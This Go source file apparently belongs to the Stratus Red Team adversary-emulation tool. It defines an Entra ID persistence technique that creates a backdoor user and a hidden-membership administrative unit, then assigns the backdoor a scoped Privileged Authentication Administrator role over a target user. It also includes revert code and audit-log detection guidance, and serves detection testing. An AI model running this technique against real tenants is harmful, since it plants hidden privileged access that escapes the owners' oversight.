package entra_id

import (
	"context"
	_ "embed"
	"errors"
	"fmt"
	"github.com/aws/smithy-go/ptr"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	graphmodels "github.com/microsoftgraph/msgraph-sdk-go/models"
	"log"
	"strings"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "entra-id.persistence.hidden-au",
		FriendlyName: "Create Hidden Scoped Role Assignment Through HiddenMembership AU",
		Description: `
Creates an [Administrative Unit (AU)](https://learn.microsoft.com/en-us/graph/api/resources/administrativeunit?view=graph-rest-1.0) with hidden membership, and a scoped role assignment over this AU.
This simulates an attacker that TODO.

Warm-up:

- Create Target Entra ID user
- Initialize Privileged Administration Administrator role

Detonation:

- Create HiddenMembership AU
- Create Backdoor Entra ID user
- Add Target user to AU
- Assign Backdoor user Privileged Administration Administrator over AU

References:

- https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/administrative-units

`,
		Detection: `
Using [Entra ID audit logs](https://learn.microsoft.com/en-us/entra/identity/monitoring-health/concept-audit-logs) with the specific activity types:

For <code>Service: Core Directory</code> and <code>Category: AdministrativeUnit</code>:
- <code>Add administrative unit</code>
- <code>Add member to administrative unit</code>

For <code>Service: Core Directory</code> and <code>Category: RoleManagement</code>:
- <code>Add scoped member to role</code>
`,
		Platform:                   stratus.EntraID,
		IsIdempotent:               false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	// Fetch details from TF
	roleId := params["paa_role_id"]
	targetUserId := params["target_user_id"]
	targetUserName := params["target_user_name"]
	suffix := params["suffix"]
	domain := params["domain"]
	password := params["random_password"]

	//graphClient setup
	graphClient := providers.EntraId().GetGraphClient()

	// 0. Create Backdoor User
	log.Println("Creating backdoor user")
	requestBodyUser := graphmodels.NewUser()
	requestBodyUser.SetAccountEnabled(ptr.Bool(true))
	displayName := fmt.Sprintf("Stratus Backdoor User - %s", suffix)
	requestBodyUser.SetDisplayName(&displayName)
	requestBodyUser.SetMailNickname(ptr.String("StratusB"))
	userPrincipalName := fmt.Sprintf("stratus-red-team-hidden-au-backdoor-%s@%s", suffix, domain)
	requestBodyUser.SetUserPrincipalName(&userPrincipalName)
	passwordProfile := graphmodels.NewPasswordProfile()
	passwordProfile.SetForceChangePasswordNextSignIn(ptr.Bool(true))

	// Using password from Terraform
	passwordProfile.SetPassword(&password)
	requestBodyUser.SetPasswordProfile(passwordProfile)

	userResult, err := graphClient.Users().Post(context.Background(), requestBodyUser, nil)
	if err != nil {
		return errors.New("could not create backdoor user: " + err.Error())
	}

	// 0.a. Save User ID from creation activity
	backdoorUserId := *userResult.GetId()
	backdoorPrincipalName := *userResult.GetUserPrincipalName()
	log.Println("Backdoor user " + backdoorPrincipalName + " successfully created")

	// 1. Create Hidden AU
	log.Println("Creating Administrative Unit with hidden membership")
	requestBodyAU := graphmodels.NewAdministrativeUnit()
	displayNameAU := fmt.Sprintf("Stratus Hidden AU - %s", suffix)
	requestBodyAU.SetDisplayName(&displayNameAU)
	description := "Hidden AU created from Stratus"
	requestBodyAU.SetDescription(&description)
	visibility := "HiddenMembership"
	requestBodyAU.SetVisibility(&visibility)

	auResult, err := graphClient.Directory().AdministrativeUnits().Post(context.Background(), requestBodyAU, nil)
	if err != nil {
		return errors.New("could not create AU: " + err.Error())
	}

	// 1.a. Save AU ID from creation activity
	auId := *auResult.GetId()
	log.Println("Successfully created Administrative Unit with ID " + auId)

	// 2. Add Target member to Hidden AU
	requestBodyMember := graphmodels.NewReferenceCreate()
	odataId := fmt.Sprintf("https://graph.microsoft.com/v1.0/users/%s", targetUserId)
	requestBodyMember.SetOdataId(&odataId)
	err = graphClient.Directory().AdministrativeUnits().ByAdministrativeUnitId(auId).Members().Ref().Post(context.Background(), requestBodyMember, nil)

	if err != nil {
		return errors.New("could not add member to AU: " + err.Error())
	}
	log.Println("Added target user " + targetUserName + " to AU")

	// 3. Assign PAA role to backdoor acct over AU
	requestBodyRole := graphmodels.NewUnifiedRoleAssignment()
	roleDefinitionId := roleId
	requestBodyRole.SetRoleDefinitionId(&roleDefinitionId)
	requestBodyRole.SetPrincipalId(&backdoorUserId)
	directoryScopeId := "/administrativeUnits/" + auId
	requestBodyRole.SetDirectoryScopeId(&directoryScopeId)

	log.Println("Assigning Privileged Authentication Administrator role to backdoor user " + backdoorPrincipalName + " over AU")
	_, err = graphClient.RoleManagement().Directory().RoleAssignments().Post(context.Background(), requestBodyRole, nil)
	if err != nil {
		return errors.New("could not assign role: " + err.Error())
	}

	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	// AU ID from detonate
	suffix := fmt.Sprintf(" - %s", params["suffix"])

	graphClient := providers.EntraId().GetGraphClient()

	// 1. Get ID of Stratus created AU
	auResult, err := graphClient.Directory().AdministrativeUnits().Get(context.Background(), nil)
	if err != nil {
		return errors.New("could not fetch AUs: " + err.Error())
	}

	var auId string
	var auName string
	for _, au := range auResult.GetValue() {
		candidateAuName := *au.GetDisplayName()
		if strings.HasSuffix(candidateAuName, suffix) {
			auId = *au.GetId()
			auName = candidateAuName
			break
		}
	}

	// 2. Delete Hidden AU
	log.Println("Deleting Administrative Unit with hidden membership " + auName)
	err = graphClient.Directory().AdministrativeUnits().ByAdministrativeUnitId(auId).Delete(context.Background(), nil)
	if err != nil {
		return errors.New("could not delete AU: " + err.Error())
	}

	// 3. Get backdoor user ID
	userResult, err := graphClient.Users().Get(context.Background(), nil)
	if err != nil {
		return errors.New("could not retrieve users: " + err.Error())
	}

	var userId string
	for _, user := range userResult.GetValue() {
		userName := *user.GetDisplayName()
		if strings.HasSuffix(userName, suffix) {
			userId = *user.GetId()
			break
		}
	}

	// 4. Delete backdoor user
	log.Println("Deleting backdoor user")
	err = graphClient.Users().ByUserId(userId).Delete(context.Background(), nil)
	if err != nil {
		return errors.New("could not delete backdoor user: " + err.Error())
	}

	return nil
}
